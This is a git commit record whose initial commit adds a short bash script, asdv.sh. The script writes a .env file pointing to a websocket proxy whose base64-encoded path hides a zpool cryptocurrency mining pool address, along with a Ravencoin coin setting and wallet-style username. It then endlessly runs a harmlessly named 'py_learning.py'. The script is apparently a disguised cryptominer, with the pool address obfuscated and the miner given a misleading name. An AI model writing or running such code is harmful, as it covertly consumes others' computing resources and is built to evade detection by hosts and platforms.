eb47bd7d607f6e44edacead723a7d0ed89a46dd8
Poke Dương <duongpoke24032007@gmail.com>
2025-06-13 17:23:54 +0000

    Initial commit

---
+++ asdv.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+
+echo -e "host=127.0.0.1\nport=3306\nproxy=wss://proxy-4r3s.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=8\npassword=c=RVN\nusername=RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4" > .env
+
+
+MIN=$1
+while true; do
+    python3 py_learning.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
+    sleep 10
+done
